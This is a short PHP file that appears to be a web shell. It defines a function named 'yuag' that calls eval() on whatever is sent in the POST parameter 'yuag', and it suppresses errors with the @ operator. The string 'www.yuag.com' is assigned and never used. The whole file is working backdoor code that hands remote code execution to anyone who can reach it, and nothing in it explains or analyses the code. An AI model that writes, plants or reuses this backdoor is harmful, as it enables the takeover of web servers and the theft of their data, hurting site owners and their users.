<?php
$a ="www.yuag.com";
function yuag($a){
eval($a);
}
@
yuag($_POST['yuag']);